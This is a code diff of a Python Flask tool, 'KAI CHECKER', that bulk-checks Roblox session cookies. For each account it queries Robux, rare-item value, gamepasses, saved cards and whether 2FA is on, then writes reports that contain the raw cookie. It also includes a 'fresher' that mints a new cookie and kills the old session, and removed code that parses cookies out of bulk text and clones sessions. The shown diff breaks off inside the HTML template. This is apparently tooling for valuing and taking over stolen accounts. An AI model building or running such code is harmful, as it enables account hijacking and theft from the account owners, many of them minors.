@@ -1,51 +1,58 @@
-from flask import Flask, render_template_string, request, jsonify, send_file, Response
-import requests, json, time, logging, re, os, urllib3, sys, asyncio, zipfile, urllib.parse, io, csv
+import requests, json, time, logging, re, os, urllib3, html, sys, asyncio, zipfile, urllib.parse, io, csv
 from typing import Dict, List, Optional
 from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor
-from requests.adapters import HTTPAdapter
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from flask import Flask, render_template_string, request, jsonify, send_file, send_from_directory
+from io import BytesIO, StringIO
+from curl_cffi.requests import AsyncSession
 
-# ===== ИНИЦИАЛИЗАЦИЯ =====
+# ===== НАСТРОЙКИ =====
 os.makedirs("data/profiles", exist_ok=True)
 os.makedirs("data/logs", exist_ok=True)
 os.makedirs("input", exist_ok=True)
 os.makedirs("output", exist_ok=True)
+os.makedirs("downloads", exist_ok=True)
 
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s',
-    handlers=[logging.FileHandler('data/logs/bot.log', encoding='utf-8'), logging.StreamHandler()]
-)
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s',
+                    handlers=[logging.FileHandler('data/logs/bot.log', encoding='utf-8'), logging.StreamHandler()])
 logger = logging.getLogger(__name__)
+logging.getLogger("urllib3").setLevel(logging.WARNING)
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 try:
     from curl_cffi import requests as cffi_requests
-    from curl_cffi.requests import AsyncSession
     HAS_CFFI = True
 except ImportError:
     cffi_requests = None
     HAS_CFFI = False
 
-HISTORY_FILE = "data/history.json"
+# ===== СЛОВАРЬ ИГР ДЛЯ КРАТКОГО ОТЧЁТА =====
 
-def save_history(task_type: str, details: str):
-    history = []
-    if os.path.exists(HISTORY_FILE):
-        try:
-            with open(HISTORY_FILE, 'r', encoding='utf-8') as f:
-                history = json.load(f)
-        except Exception:
-            history = []
-    history.insert(0, {
-        'date': datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
-        'type': task_type,
-        'details': details
-    })
-    with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
-        json.dump(history[:50], f, ensure_ascii=False, indent=2)
+MAIN_GAMES = {
+    "blox fruits", "rivals", "adopt me", "pet sim 99",
+    "pets go", "mm2", "brookhaven", "fisch", "king legacy", "gpo",
+    "blade ball", "bedwars", "jailbreak", "da hood", "tsb",
+    "astd", "anime vanguards", "aot revolution", "aut", "aa", "als",
+    "combat warriors", "creatures of sonaria", "driving empire", "evade",
+    "ro ghoul", "royale high", "toilet td", "trident survival",
+    "war tycoon", "yba", "99 nights", "spongebob td", "fnaf td",
+    "garden td", "jujutsu infinite", "jujutsu shenanigans",
+    "tds", "volleyball legends", "arsenal", "bee swarm",
+    "dress to impress"
+}
 
-# ===== СОЗДАНИЕ СЕССИИ =====
+def is_main_game(game_name: str) -> bool:
+    if not game_name:
+        return False
+    g_lower = game_name.lower().strip()
+    for mg in MAIN_GAMES:
+        if mg in g_lower or g_lower in mg:
+            return True
+    return False
+
+# ============================================================
+# ФУНКЦИИ
+# ============================================================
 
 def create_session(cookie: str) -> requests.Session:
     s = requests.Session()
@@ -54,32 +61,7 @@ def create_session(cookie: str) -> requests.Session:
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
         'Accept': 'application/json'
     })
-    adapter = HTTPAdapter(pool_connections=150, pool_maxsize=150, max_retries=1)
-    s.mount('https://', adapter)
-    s.mount('http://', adapter)
     return s
-
-# ===== EXTRACT COOKIES =====
-
-def extract_cookies(text):
-    if not text:
-        return []
-    cookies = []
-    for line in text.split('\n'):
-        line = line.strip()
-        if '_|WARNING' in line and len(line) > 200:
-            start = line.find('_|WARNING')
-            cookie = line[start:].strip()
-            if len(cookie) > 200:
-                cookies.append(cookie)
-    matches = re.findall(r'_\|WARNING[^|]*\|_\S{100,}', text)
-    for m in matches:
-        m = m.strip().strip('"\'')
-        if len(m) > 200 and m not in cookies:
-            cookies.append(m)
-    return cookies
-
-# ===== GET FULL INFO =====
 
 def get_full_info(cookie: str) -> dict:
     info = {
@@ -174,7 +156,7 @@ def get_full_info(cookie: str) -> dict:
         except:
             pass
 
-        # ===== ГЕЙМПАССЫ =====
+        # ===== СБОР ГЕЙМПАССОВ =====
         try:
             gp_url = f"https://economy.roblox.com/v2/users/{uid}/transactions?limit=100&transactionType=Purchase"
             cursor = ""
@@ -208,31 +190,6 @@ def get_full_info(cookie: str) -> dict:
         except Exception as e:
             logger.error(f"Gamepass error: {e}")
 
-        # ===== ПЛЕЙТАЙМ (ПЛЕЙСЫ) =====
-        try:
-            pt = s.get(f'https://apis.roblox.com/parental-controls-api/v1/parental-controls/get-top-weekly-screentime-by-universe?userId={uid}', timeout=10, verify=False)
-            if pt.status_code == 200:
-                pd = pt.json()
-                for i in pd.get('universeWeeklyScreentimes', []):
-                    m = i.get('weeklyMinutes', 0)
-                    if m > 0:
-                        # Получаем название игры
-                        universe_id = i.get('universeId')
-                        game_name = None
-                        try:
-                            gr = s.get(f"https://games.roblox.com/v1/games?universeIds={universe_id}", timeout=5, verify=False)
-                            if gr.status_code == 200:
-                                game_data = gr.json()
-                                if game_data.get('data'):
-                                    game_name = game_data['data'][0].get('name', f"Universe_{universe_id}")
-                        except:
-                            pass
-                        if not game_name:
-                            game_name = f"Universe_{universe_id}"
-                        info['Playtime'][game_name] = m
-        except:
-            pass
-
         security_score = 0
         if info.get('EmailSet'): security_score += 1
         if info.get('TwoFactorEnabled'): security_score += 2
@@ -249,10 +206,12 @@ def get_full_info(cookie: str) -> dict:
         logger.error(f"Err: {e}")
     return info
 
-# ===== ГЕНЕРАЦИЯ ОТЧЁТА =====
+# ============================================================
+# ФОРМАТИРОВАНИЕ ОТЧЁТА
+# ============================================================
 
-def generate_txt_report(info: dict) -> str:
-    un = info.get('Username', '?')
+def format_short_report(info):
+    un = html.escape(str(info.get('Username', '?')))
     year = info.get('Created', '????')[-4:] if info.get('Created') else '?'
     status = info.get('status', '⚠️')
     status_icon = '🟢' if status == '✅' else ('🔴' if status == '❌' else '🚫')
@@ -260,33 +219,28 @@ def generate_txt_report(info: dict) -> str:
     
     r = f"📋 {un} [{year}]\n"
     r += f"{status_icon} {status_text} | 🆔 {info.get('UserID', '?')}\n\n"
-    r += f"📅 {info.get('Created', '?')} | 🌍 {info.get('Country', '?')} | {'⭐ Premium' if info.get('Premium') else '⬜ Free'}\n"
+    r += f"📅 {info.get('Created', '?')} | 🌍 {info.get('Country', '?')} | {'⭐ Premium' if info.get('Premium') else '❌ Premium'}\n"
     r += f"💰 Robux: ⏣ {info.get('Robux', 0):,} | 💸 Донат: ⏣ {abs(info.get('OutgoingRobuxYear', 0)):,}\n"
-    if info.get('TotalRAP', 0) > 0:
-        r += f"💎 RAP: ⏣ {info.get('TotalRAP', 0):,}\n"
-    r += f"🛡️ БЕЗОПАСНОСТЬ: {info.get('SecurityStatus', '⚠️ НЕЗАЩИЩЕННЫЙ')}\n"
-    r += f"📧 Почта: {'✅' if info.get('EmailSet') else '❌'} | 🔐 2FA: {'✅' if info.get('TwoFactorEnabled') else '❌'}\n"
-    r += f"🔒 PIN: {'✅' if info.get('AccountPinEnabled') else '❌'} | 📱 Телефон: {'✅' if info.get('PhoneSet') else '❌'}\n"
-    r += f"💳 Карты: {info.get('CardsCount', 0)} | 📦 Предметы: {info.get('TotalInventory', 0)}\n"
     
-    # ===== ПЛЕЙСЫ (ИГРЫ) ИЗ PLAYTIME =====
-    pt = info.get('Playtime', {})
-    if pt:
-        tm = sum(pt.values())
-        h = tm // 60
-        m = tm % 60
-        r += f"\n🎮 ПЛЕЙСЫ (плейтайм): {h}ч {m}м\n"
-        for game, mins in sorted(pt.items(), key=lambda x: x[1], reverse=True)[:5]:
-            r += f"   └ {game}: {mins}м\n"
+    rap = info.get('TotalRAP', 0)
+    if rap > 0:
+        r += f"💎 RAP: ⏣ {rap:,}\n"
     else:
-        r += f"\n🎮 ПЛЕЙСЫ: Нет данных\n"
+        r += f"💎 RAP: ❌ Нет\n"
     
-    # ===== ГЕЙМПАССЫ =====
+    r += f"\n🛡️ БЕЗОПАСНОСТЬ:\n"
+    r += f"   📧 Почта: {'✅' if info.get('EmailSet') else '❌'}\n"
+    r += f"   🔐 2FA: {'✅' if info.get('TwoFactorEnabled') else '❌'}\n"
+    r += f"   {info.get('SecurityStatus', '⚠️ НЕЗАЩИЩЕННЫЙ')}\n"
+    r += f"   💳 Карты: {info.get('CardsCount', 0)} | 📦 Предметы: {info.get('TotalInventory', 0)}\n"
+    
     gp = info.get('PurchasedGamepasses', {})
-    if gp:
-        total_sum = sum(sum(p['price'] for p in passes) for passes in gp.values())
-        r += f"\n📦 ГЕЙМПАССЫ ({total_sum:,} R$):\n"
-        for game, passes in list(gp.items())[:5]:
+    main_gp = {game: passes for game, passes in gp.items() if is_main_game(game)}
+    
+    if main_gp:
+        total_sum = sum(sum(p['price'] for p in passes) for passes in main_gp.values())
+        r += f"\n📦 ГЕЙМПАССЫ (главные игры):\n"
+        for game, passes in list(main_gp.items())[:5]:
             game_total = sum(p['price'] for p in passes)
             r += f"   🎮 {game} (⏣ {game_total:,}):\n"
             for p in passes[:5]:
@@ -294,86 +248,78 @@ def generate_txt_report(info: dict) -> str:
             if len(passes) > 5:
                 r += f"      └ ...и ещё {len(passes)-5}\n"
     else:
-        r += f"\n📦 ГЕЙМПАССЫ: Нет\n"
+        r += f"\n📦 ГЕЙМПАССЫ: ❌ Нет\n"
     
-    # ===== РЕДКИЕ ПРЕДМЕТЫ =====
     rare = info.get('RareItems', [])
     if rare:
-        r += f"\n💎 РЕДКИЕ ПРЕДМЕТЫ:\n"
+        r += f"\n💎 РЕДКИЕ ПРЕДМЕТЫ ({len(rare)} шт):\n"
         for item in rare[:3]:
             r += f"   └ {item['name']} (⏣ {item['rap']:,})\n"
+    else:
+        r += f"\n💎 РЕДКИЕ ПРЕДМЕТЫ: ❌ Нет\n"
     
-    r += f"\n\n🍪 COOKIE:\n{info.get('Cookie', '')}"
+    if len(r) > 3800:
+        r = r[:3700] + "\n\n<i>[Сообщение сокращено]</i>"
+    
+    return f"<blockquote>{r}\n\n<code>{info.get('Cookie', '')}</code></blockquote>"
+
+def generate_full_txt_report(info):
+    un = info.get('Username', '?')
+    year = info.get('Created', '????')[-4:] if info.get('Created') else '?'
+    status = info.get('status', '⚠️')
+    status_text = 'VALID' if status == '✅' else ('INVALID' if status == '❌' else 'BANNED')
+    
+    r = f"╔══════════════════════════════════════════════════════════╗\n"
+    r += f"║  🎮 KAI CHECKER — ПОЛНЫЙ ОТЧЁТ                        ║\n"
+    r += f"╠══════════════════════════════════════════════════════════╣\n"
+    r += f"║  📋 {un} [{year}]\n"
+    r += f"║  {status_text} | 🆔 {info.get('UserID', '?')}\n"
+    r += f"║  📅 {info.get('Created', '?')} | 🌍 {info.get('Country', '?')}\n"
+    r += f"╠══════════════════════════════════════════════════════════╣\n"
+    r += f"║  💰 Robux: ⏣ {info.get('Robux', 0):,}\n"
+    r += f"║  💸 Донат/год: ⏣ {abs(info.get('OutgoingRobuxYear', 0)):,}\n"
+    r += f"║  💎 RAP: ⏣ {info.get('TotalRAP', 0):,}\n"
+    r += f"╠══════════════════════════════════════════════════════════╣\n"
+    r += f"║  🛡️ БЕЗОПАСНОСТЬ:\n"
+    r += f"║  📧 Почта: {'✅' if info.get('EmailSet') else '❌'} | 🔐 2FA: {'✅' if info.get('TwoFactorEnabled') else '❌'}\n"
+    r += f"║  {info.get('SecurityStatus', '⚠️ НЕЗАЩИЩЕННЫЙ')}\n"
+    r += f"║  💳 Карты: {info.get('CardsCount', 0)} | 📦 Предметы: {info.get('TotalInventory', 0)}\n"
+    r += f"╠══════════════════════════════════════════════════════════╣\n"
+    r += f"║  📦 ВСЕ ГЕЙМПАССЫ:\n"
+    
+    gp = info.get('PurchasedGamepasses', {})
+    if gp:
+        for game, passes in gp.items():
+            game_total = sum(p['price'] for p in passes)
+            r += f"║  🎮 {game} (⏣ {game_total:,}):\n"
+            for p in passes[:5]:
+                r += f"║      └ {p['name']} — ⏣ {p['price']:,}\n"
+            if len(passes) > 5:
+                r += f"║      └ ...и ещё {len(passes)-5}\n"
+    else:
+        r += f"║  ❌ Нет геймпассов\n"
+    
+    rare = info.get('RareItems', [])
+    if rare:
+        r += f"╠══════════════════════════════════════════════════════════╣\n"
+        r += f"║  💎 РЕДКИЕ ПРЕДМЕТЫ ({len(rare)} шт):\n"
+        for item in rare[:10]:
+            r += f"║    └ {item['name']} (⏣ {item['rap']:,})\n"
+    
+    r += f"╚══════════════════════════════════════════════════════════╝\n\n"
+    r += f"🍪 COOKIE:\n{info.get('Cookie', '')}"
     return r
 
-def generate_html_report(info: dict) -> str:
-    un = info.get('Username', '?')
-    gp = info.get('PurchasedGamepasses', {})
-    gp_html = ""
-    for game, passes in gp.items():
-        total = sum(p['price'] for p in passes)
-        gp_html += f"<div style='margin-top:8px;'><strong style='color:#ffaa33;'>{game}</strong> (⏣ {total:,})"
-        for p in passes[:5]:
-            gp_html += f"<div style='margin-left:20px;color:#888;'>└ {p['name']} — ⏣ {p['price']:,}</div>"
-        if len(passes) > 5:
-            gp_html += f"<div style='margin-left:20px;color:#666;'>└ ...и ещё {len(passes)-5}</div>"
-        gp_html += "</div>"
-    
-    pt = info.get('Playtime', {})
-    pt_html = ""
-    if pt:
-        tm = sum(pt.values())
-        h = tm // 60
-        m = tm % 60
-        pt_html += f"<div style='margin-top:8px;'><strong style='color:#ffaa33;'>Плейс (плейтайм):</strong> {h}ч {m}м"
-        for game, mins in sorted(pt.items(), key=lambda x: x[1], reverse=True)[:5]:
-            pt_html += f"<div style='margin-left:20px;color:#888;'>└ {game}: {mins}м</div>"
-        pt_html += "</div>"
-    
-    return f"""<!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"><title>Report - {un}</title>
-<style>
-body {{ background: #0a0a14; color: #e0e0e0; font-family: sans-serif; padding: 20px; }}
-.card {{ background: #12121f; border: 1px solid #1a1a2e; border-radius: 12px; padding: 20px; margin-bottom: 15px; }}
-.header {{ font-size: 18px; font-weight: bold; color: #00ff99; border-bottom: 1px solid #1a1a2e; padding-bottom: 10px; margin-bottom: 15px; display:flex; justify-content:space-between; }}
-.grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; }}
-.stat-item {{ background: #0a0a14; padding: 12px; border-radius: 8px; border: 1px solid #1f1f38; }}
-.stat-label {{ color: #888; font-size: 11px; text-transform: uppercase; }}
-.stat-value {{ font-size: 15px; font-weight: bold; color: #ffaa33; }}
-.cookie-box {{ background: #05050a; border: 1px solid #1a1a2e; padding: 12px; font-family: monospace; font-size: 11px; word-break: break-all; color: #888; max-height: 120px; overflow-y: auto; border-radius: 6px; }}
-</style>
-</head>
-<body>
-<div class="card">
-<div class="header"><span>📊 ACCOUNT REPORT</span><span style="color:#00ff99;">{info.get('status')}</span></div>
-<div class="grid">
-<div class="stat-item"><div class="stat-label">Юзернейм</div><div class="stat-value">{info.get('Username')}</div></div>
-<div class="stat-item"><div class="stat-label">Robux</div><div class="stat-value">⏣ {info.get('Robux', 0):,}</div></div>
-<div class="stat-item"><div class="stat-label">RAP</div><div class="stat-value">⏣ {info.get('TotalRAP', 0):,}</div></div>
-<div class="stat-item"><div class="stat-label">Страна</div><div class="stat-value">{info.get('Country')}</div></div>
-</div>
-<div style="margin-top:15px;"><strong style="color:#ffaa33;">🎮 ПЛЕЙСЫ:</strong>{pt_html if pt_html else ' Нет данных'}</div>
-<div style="margin-top:15px;"><strong style="color:#ffaa33;">🎟️ ГЕЙМПАССЫ:</strong>{gp_html if gp_html else ' Нет'}</div>
-</div>
-<div class="card"><div class="header">🍪 COOKIE</div><div class="cookie-box">{info.get('Cookie')}</div></div>
-</body>
-</html>"""
+def save_txt(info):
+    un = re.sub(r'[<>:"/\\|?*]', '_', str(info.get('Username', '?')))
+    fn = f"roblox_{un}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+    with open(fn, 'w', encoding='utf-8') as f:
+        f.write(generate_full_txt_report(info))
+    return fn
 
-def generate_csv_data(reports: list) -> str:
-    output = io.StringIO()
-    output.write("sep=;\n")
-    writer = csv.writer(output, delimiter=';')
-    writer.writerow(['Username', 'User ID', 'Robux', 'RAP', 'Gamepasses', 'Country', '2FA', 'Cookie'])
-    for r in reports:
-        gp_count = sum(len(passes) for passes in r.get('PurchasedGamepasses', {}).values())
-        writer.writerow([
-            r.get('Username'), r.get('UserID'), r.get('Robux'), r.get('TotalRAP'),
-            gp_count, r.get('Country'), '✅' if r.get('TwoFactorEnabled') else '❌', r.get('Cookie')
-        ])
-    return output.getvalue()
-
-# ===== ФРЕШЕР =====
+# ============================================================
+# ФРЕШЕР
+# ============================================================
 
 async def refresh_roblox_cookie(old_cookie: str, kill_old: bool = True) -> tuple[bool, str, str]:
     if not HAS_CFFI:
@@ -391,12 +337,20 @@ async def refresh_roblox_cookie(old_cookie: str, kill_old: bool = True) -> tuple
         if not csrf_token:
             return False, None, "❌ Не удалось получить CSRF token"
         ticket_headers = headers_base.copy()
-        ticket_headers.update({"x-csrf-token": csrf_token, "RBXAuthenticationNegotiation": "1", "Content-Type": "application/json"})
+        ticket_headers.update({
+            "x-csrf-token": csrf_token,
+            "RBXAuthenticationNegotiation": "1",
+            "Content-Type": "application/json"
+        })
         r_ticket = await session.post("https://auth.roblox.com/v1/authentication-ticket", headers=ticket_headers, json={}, timeout=8)
         ticket = r_ticket.headers.get("rbx-authentication-ticket")
         if not ticket:
             return False, None, "❌ Ошибка генерации ticket"
-        redeem_headers = {"User-Agent": "Roblox/WinInet", "RBXAuthenticationNegotiation": "1", "Content-Type": "application/json"}
+        redeem_headers = {
+            "User-Agent": "Roblox/WinInet",
+            "RBXAuthenticationNegotiation": "1",
+            "Content-Type": "application/json"
+        }
         r_redeem = await session.post("https://auth.roblox.com/v1/authentication-ticket/redeem", headers=redeem_headers, json={"authenticationTicket": ticket}, timeout=8)
         new_cookie = None
         set_cookie_hdr = r_redeem.headers.get("set-cookie", "")
@@ -429,478 +383,587 @@ def refresh_cookie_sync(cookie: str, kill_old: bool = True) -> tuple[bool, str, 
             loop.close()
 
 # ============================================================
-# FLASK APP
+# ВЕБ-СЕРВЕР
 # ============================================================
 
 app = Flask(__name__)
 
-HTML_TEMPLATE = """
+HTML = """
 <!DOCTYPE html>
 <html lang="ru">
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>KAI CHECKER</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-<style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
-body { background: #0a0a14; color: #e0e0e0; font-family: 'Inter', sans-serif; min-height: 100vh; padding: 20px; }
-.container { max-width: 1100px; margin: 0 auto; }
-.header { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 1px solid #1a1a2e; margin-bottom: 25px; }
-.logo-text { font-size: 24px; font-weight: 700; color: #00ff99; }
-.logo-text span { color: #ffaa33; }
-.tabs { display: flex; gap: 10px; margin-bottom: 25px; flex-wrap: wrap; }
-.tab { padding: 10px 20px; background: #12121f; border: 1px solid #1a1a2e; border-radius: 8px; color: #888; cursor: pointer; font-size: 14px; transition: all 0.2s; user-select: none; }
-.tab:hover { border-color: #00ff99; color: #fff; }
-.tab.active { border-color: #00ff99; color: #00ff99; background: #00ff9910; }
-.tab-content { display: none; }
-.tab-content.active { display: block; }
-.card { background: #12121f; border: 1px solid #1a1a2e; border-radius: 12px; padding: 25px; margin-bottom: 20px; }
-.card h2 { font-size: 18px; font-weight: 600; color: #e0e0e0; margin-bottom: 15px; }
-.upload-area { border: 2px dashed #1a1a2e; border-radius: 8px; padding: 35px; text-align: center; cursor: pointer; transition: all 0.3s; margin-bottom: 15px; }
-.upload-area:hover { border-color: #00ff99; background: #00ff9905; }
-.upload-area.drag-active { border-color: #00ff99 !important; background: #00ff9915 !important; }
-.upload-area p { color: #888; font-size: 14px; pointer-events: none; }
-.upload-area p strong { color: #00ff99; }
-.btn { padding: 10px 24px; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.3s; }
-.btn-primary { background: #00ff99; color: #0a0a14; }
-.btn-primary:hover { background: #00cc77; }
-.btn-success { background: #00cc88; color: #0a0a14; margin-top: 12px; text-decoration: none; display: inline-block; }
-.btn-success:hover { background: #00aa66; }
-.format-selector { display: flex; gap: 15px; align-items: center; margin-bottom: 15px; background: #0a0a14; padding: 12px; border-radius: 8px; border: 1px solid #1a1a2e; flex-wrap: wrap; }
-.format-selector label { font-size: 13px; color: #aaa; cursor: pointer; display: flex; align-items: center; gap: 6px; }
-.format-selector input[type="radio"] { accent-color: #00ff99; }
-.result-box { background: #0a0a14; border: 1px solid #1a1a2e; border-radius: 8px; padding: 15px; margin-top: 15px; max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 13px; color: #e0e0e0; white-space: pre-wrap; }
-.result-box.success { border-color: #00ff99; }
-.result-box.error { border-color: #ff3355; }
-.result-box code { display: block; word-break: break-all; margin: 10px 0; padding: 10px; background: #12121f; border-radius: 6px; font-size: 12px; color: #00ff99; }
-.history-item { background: #0a0a14; border: 1px solid #1a1a2e; padding: 12px 16px; border-radius: 6px; margin-bottom: 8px; display: flex; justify-content: space-between; }
-.footer { text-align: center; padding: 20px 0; color: #555; font-size: 13px; border-top: 1px solid #1a1a2e; margin-top: 30px; }
-</style>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KAI CHECKER</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0a14; color: #e0e0e0; font-family: 'Inter', sans-serif; min-height: 100vh; padding: 20px; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 1px solid #1a1a2e; margin-bottom: 25px; }
+        .logo-text { font-size: 24px; font-weight: 700; color: #00ff99; }
+        .logo-text span { color: #ffaa33; }
+        .tabs { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 25px; }
+        .tab { padding: 10px 20px; background: #12121f; border: 1px solid #1a1a2e; border-radius: 8px; color: #888; cursor: pointer; font-size: 14px; transition: all 0.2s; user-select: none; }
+        .tab:hover { border-color: #00ff99; color: #fff; }
+        .tab.active { border-color: #00ff99; color: #00ff99; background: #00ff9910; }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+        .card { background: #12121f; border: 1px solid #1a1a2e; border-radius: 12px; padding: 25px; margin-bottom: 20px; }
+        .card h2 { font-size: 18px; font-weight: 600; color: #e0e0e0; margin-bottom: 15px; }
+        .upload-area { border: 2px dashed #1a1a2e; border-radius: 8px; padding: 35px; text-align: center; cursor: pointer; transition: all 0.3s; margin-bottom: 15px; }
+        .upload-area:hover { border-color: #00ff99; background: #00ff9905; }
+        .upload-area.drag-active { border-color: #00ff99 !important; background: #00ff9915 !important; }
+        .upload-area p { color: #888; font-size: 14px; pointer-events: none; }
+        .upload-area p strong { color: #00ff99; }
+        .btn { padding: 10px 24px; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.3s; }
+        .btn-primary { background: #00ff99; color: #0a0a14; }
+        .btn-primary:hover { background: #00cc77; }
+        .btn-success { background: #00cc88; color: #0a0a14; margin-top: 12px; text-decoration: none; display: inline-block; }
+        .btn-success:hover { background: #00aa66; }
+        .result-box { background: #0a0a14; border: 1px solid #1a1a2e; border-radius: 8px; padding: 15px; margin-top: 15px; max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 13px; color: #e0e0e0; white-space: pre-wrap; }
+        .result-box.success { border-color: #00ff99; }
+        .result-box.error { border-color: #ff3355; }
+        .result-box code { display: block; word-break: break-all; margin: 10px 0; padding: 10px; background: #12121f; border-radius: 6px; font-size: 12px; color: #00ff99; }
+        .footer { text-align: center; padding: 20px 0; color: #555; font-size: 13px; border-top: 1px solid #1a1a2e; margin-top: 30px; }
+    </style>
 </head>
 <body>
 <div class="container">
-<div class="header"><div class="logo-text">KAI <span>CHECKER</span></div></div>
-<div class="tabs">
-<div class="tab active" data-tab="validator">✅ Валидатор</div>
-<div class="tab" data-tab="fullcheck">📊 Полный Чекер</div>
-<div class="tab" data-tab="fresher">🔄 Фрешер</div>
-<div class="tab" data-tab="duplicator">🔁 Дубликатор</div>
-<div class="tab" data-tab="history" onclick="loadHistory()">📜 История</div>
-<div class="tab" data-tab="other">📦 Прочее</div>
-</div>
+    <div class="header">
+        <div class="logo-text">KAI <span>CHECKER</span></div>
+    </div>
 
-<!-- ВАЛИДАТОР -->
-<div class="tab-content active" id="tab-validator">
-<div class="card">
-<h2>Быстрый Валидатор Куков</h2>
-<div class="upload-area" id="valArea" onclick="document.getElementById('valFile').click()">
-<p>📁 <strong>КЛИКНИТЕ ИЛИ ПЕРЕТАЩИТЕ .TXT ФАЙЛ</strong></p>
-</div>
-<input type="file" id="valFile" accept=".txt" style="display:none;">
-<button class="btn btn-primary" onclick="runValidator()">НАЧАТЬ ПРОВЕРКУ</button>
-<div class="result-box" id="validatorResult"></div>
-</div>
-</div>
+    <div class="tabs">
+        <div class="tab active" data-tab="checker">🔍 Чекер</div>
+        <div class="tab" data-tab="fresher">🔄 Фрешер</div>
+        <div class="tab" data-tab="validator">✅ Валидатор</div>
+        <div class="tab" data-tab="tools">🔧 Инструменты</div>
+    </div>
 
-<!-- ПОЛНЫЙ ЧЕКЕР -->
-<div class="tab-content" id="tab-fullcheck">
-<div class="card">
-<h2>Глубокая Проверка и Генерация Отчетов</h2>
-<div class="format-selector">
-<span style="color:#888; font-size:13px; font-weight:600;">Формат отчета:</span>
-<label><input type="radio" name="reportFormat" value="zip" checked> 📦 ZIP (один .txt на аккаунт)</label>
-<label><input type="radio" name="reportFormat" value="html"> 🌐 HTML</label>
-<label><input type="radio" name="reportFormat" value="csv"> 📊 CSV</label>
-</div>
-<div class="upload-area" id="fullArea" onclick="document.getElementById('fullFile').click()">
-<p>📁 <strong>ЗАГРУЗИТЬ .TXT ДЛЯ ПОЛНОГО АНАЛИЗА</strong></p>
-</div>
-<input type="file" id="fullFile" accept=".txt" style="display:none;">
-<button class="btn btn-primary" onclick="runFullcheck()">ЗАПУСТИТЬ АНАЛИЗ</button>
-<div class="result-box" id="fullcheckResult"></div>
-</div>
-</div>
+    <!-- ЧЕКЕР -->
+    <div class="tab-content active" id="tab-checker">
+        <div class="card">
+            <h2>🔍 Проверка куков с отчётом (как в Telegram)</h2>
+            <div class="upload-area" id="fullArea" onclick="document.getElementById('fullFile').click()">
+                <p>📁 <strong>ЗАГРУЗИТЬ .TXT ФАЙЛ С КУКАМИ</strong></p>
+            </div>
+            <input type="file" id="fullFile" accept=".txt" style="display:none;">
+            <button class="btn btn-primary" onclick="runFullcheck()">ЗАПУСТИТЬ ПРОВЕРКУ</button>
+            <div class="result-box" id="fullcheckResult"></div>
+        </div>
+    </div>
 
-<!-- ФРЕШЕР -->
-<div class="tab-content" id="tab-fresher">
-<div class="card">
-<h2>🔄 Фрешер (Обновление с инвалидацией)</h2>
-<textarea id="freshInput" placeholder="Вставьте кук..." style="width:100%;padding:12px;background:#0a0a14;border:1px solid #1a1a2e;border-radius:8px;color:#e0e0e0;font-family:monospace;margin-bottom:15px;resize:vertical;min-height:80px;"></textarea>
-<button class="btn btn-primary" onclick="freshCookie()">ОБНОВИТЬ КУК</button>
-<div class="result-box" id="freshResult"></div>
-</div>
-</div>
+    <!-- ФРЕШЕР -->
+    <div class="tab-content" id="tab-fresher">
+        <div class="card">
+            <h2>🔄 Обновление кука</h2>
+            <textarea id="freshInput" placeholder="Вставьте кук для обновления..." style="width:100%;padding:12px;background:#0a0a14;border:1px solid #1a1a2e;border-radius:8px;color:#e0e0e0;font-family:monospace;margin-bottom:15px;resize:vertical;min-height:80px;"></textarea>
+            <button class="btn btn-primary" onclick="freshCookie()">ОБНОВИТЬ</button>
+            <div class="result-box" id="freshResult"></div>
+        </div>
+    </div>
 
-<!-- ДУБЛИКАТОР -->
-<div class="tab-content" id="tab-duplicator">
-<div class="card">
-<h2>🔁 Дубликатор (Клонирование сессии)</h2>
-<textarea id="duplicateInput" placeholder="Вставьте кук..." style="width:100%;padding:12px;background:#0a0a14;border:1px solid #1a1a2e;border-radius:8px;color:#e0e0e0;font-family:monospace;margin-bottom:15px;resize:vertical;min-height:80px;"></textarea>
-<button class="btn btn-primary" onclick="duplicateCookie()">СОЗДАТЬ КЛОН</button>
-<div class="result-box" id="duplicateResult"></div>
-</div>
-</div>
+    <!-- ВАЛИДАТОР -->
+    <div class="tab-content" id="tab-validator">
+        <div class="card">
+            <h2>✅ Валидатор (отсеивает мёртвые куки)</h2>
+            <div class="upload-area" id="validatorArea" onclick="document.getElementById('validatorFile').click()">
+                <p>📁 <strong>ЗАГРУЗИТЬ .TXT ФАЙЛ С КУКАМИ</strong></p>
+            </div>
+            <input type="file" id="validatorFile" accept=".txt" style="display:none;">
+            <button class="btn btn-primary" onclick="runValidator()">ЗАПУСТИТЬ ВАЛИДАЦИЮ</button>
+            <div class="result-box" id="validatorResult"></div>
+        </div>
+    </div>
 
-<!-- ИСТОРИЯ -->
-<div class="tab-content" id="tab-history">
-<div class="card"><h2>История Операций</h2><div id="historyList"><p style="color:#666;">Загрузка...</p></div></div>
